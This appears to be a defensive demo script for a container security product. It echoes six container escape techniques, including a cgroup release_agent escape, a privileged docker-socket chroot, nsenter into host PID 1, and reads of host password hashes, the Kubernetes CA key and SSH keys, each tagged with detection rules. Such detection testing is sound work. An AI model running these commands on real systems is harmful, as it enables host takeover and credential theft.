#!/bin/bash
# =============================================================================
# runtime/container_escape.sh — TigerGate CNAPP: CWPP Runtime Security
# =============================================================================
# PURPOSE: Demonstrates container escape techniques that CWPP/CDR tools should
# detect via eBPF-based runtime monitoring, syscall auditing, or seccomp alerts.
#
# ⚠️ EDUCATIONAL SIMULATION — These commands are logged/simulated only.
# Run in an isolated sandbox only. Never run against production infrastructure.
#
# CWPP/CDR DETECTIONS:
#   ESC-001: Mount of host filesystem (cgroup escape technique)
#   ESC-002: Docker socket mounted — create privileged sibling container
#   ESC-003: /proc/sched_debug read — detect other PID namespaces
#   ESC-004: SYS_ADMIN capability abuse (Linux namespace escape)
#   ESC-005: nsenter to host PID 1 — full host shell
#   ESC-006: Sensitive host file read via hostPath volume
# =============================================================================

set -euo pipefail

SIMULATE_ONLY=true  # Set to false only in isolated lab environment!

simulate() {
    echo "  [SIMULATED] $*"
}

echo "=================================================="
echo "TigerGate CWPP: Container Escape Technique Demo"
echo "=================================================="

# ── ESC-001: Cgroup Filesystem Escape ────────────────────────────────────────
echo ""
echo "[ESC-001] Cgroup v1 release_agent escape (CVE-2022-0492 technique)"
echo "  Detection: Falco rule 'launch_privileged_container' + 'write_release_agent_file'"
if [ "$SIMULATE_ONLY" = true ]; then
    simulate "mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp"
    simulate "mkdir /tmp/cgrp/escape && echo 1 > /tmp/cgrp/escape/notify_on_release"
    simulate "echo \"/reverse_shell.sh\" > /tmp/cgrp/release_agent"
    simulate "# Host executes /reverse_shell.sh as root!"
fi
echo "  CWE: CWE-269 (Improper Privilege Management)"

# ── ESC-002: Docker Socket Escape ─────────────────────────────────────────────
echo ""
echo "[ESC-002] Docker socket escape (most common real-world technique)"
echo "  Requirement: Container has /var/run/docker.sock mounted (see kspm/pod_security_policy.yaml)"
echo "  Detection: Falco 'contact_docker_socket' rule, TigerGate CWPP runtime"
if [ "$SIMULATE_ONLY" = true ]; then
    simulate "ls -la /var/run/docker.sock   # Check if socket is accessible"
    simulate "docker -H unix:///var/run/docker.sock run -it --privileged -v /:/host ubuntu chroot /host"
    simulate "# Now running as root in a new container WITH the full host filesystem at /host"
    simulate "chroot /host sh   # Full root shell on host OS!"
fi
echo "  MITRE: T1611 – Escape to Host"

# ── ESC-003: Proc Filesystem Enumeration ──────────────────────────────────────
echo ""
echo "[ESC-003] /proc filesystem enumeration — host process detection"
echo "  Detection: Runtime monitoring for reads of /proc/sched_debug, /proc/1/environ"
if [ "$SIMULATE_ONLY" = true ]; then
    simulate "cat /proc/1/environ | tr '\\0' '\\n'   # Host PID 1 env vars (may have secrets!)"
    simulate "cat /proc/sched_debug | grep 'docker'  # Detect all containers on host"
    simulate "ls /proc/$(cat /proc/1/status | grep PPid | awk '{print \$2}')/"
fi
echo "  Sensitive host files accessible via /proc when hostPID=true"

# ── ESC-004: SYS_ADMIN Capability Abuse ───────────────────────────────────────
echo ""
echo "[ESC-004] SYS_ADMIN capability abuse — namespace escape via newuidmap"
echo "  Requirement: Container has SYS_ADMIN capability (or is running privileged)"
echo "  Detection: seccomp profile violation, auditd, TigerGate CWPP"
if [ "$SIMULATE_ONLY" = true ]; then
    simulate "capsh --print | grep sys_admin   # Verify SYS_ADMIN is present"
    simulate "unshare -UrmC bash               # Create new user namespace as 'root'"
    simulate "mount -o bind /host/etc /mnt/etc # Mount host /etc in new namespace"
    simulate "# Now 'root' in container context with access to host resources"
fi
echo "  CVE-2022-0847 (Dirty Pipe) exploitable with SYS_ADMIN capability"

# ── ESC-005: nsenter Host Shell ────────────────────────────────────────────────
echo ""
echo "[ESC-005] nsenter into host PID namespace — root shell on host"
echo "  Requirement: hostPID: true in pod spec (see kspm/pod_security_policy.yaml)"
echo "  Detection: Falco 'run_shell_in_container', TigerGate process monitoring"
if [ "$SIMULATE_ONLY" = true ]; then
    simulate "nsenter --target 1 --mount --uts --ipc --net --pid -- bash"
    simulate "# Fully escaped! Now running in host's PID/mount/network namespaces"
    simulate "hostname   # Shows HOST hostname, not container hostname"
    simulate "ps aux     # Shows ALL host processes including other containers"
fi
echo "  MITRE: T1611 – Escape to Host, T1057 – Process Discovery"

# ── ESC-006: hostPath Volume Sensitive File Read ──────────────────────────────
echo ""
echo "[ESC-006] hostPath volume — reading sensitive host files"
echo "  Detection: TigerGate KSPM (pod has hostPath mount), CWPP runtime"
if [ "$SIMULATE_ONLY" = true ]; then
    simulate "cat /host/etc/shadow          # Read host password hashes"
    simulate "cat /host/etc/kubernetes/pki/ca.key  # Steal K8s CA private key!"
    simulate "cat /host/root/.ssh/id_rsa   # Steal SSH private key"
    simulate "cat /host/var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/*/token"
fi
echo "  Impact: Full cluster takeover via stolen K8s CA key"

echo ""
echo "=================================================="
echo "All 6 escape techniques simulated."
echo "TigerGate CWPP should detect: privileged containers, docker.sock mounts, namespace escapes"
echo "=================================================="
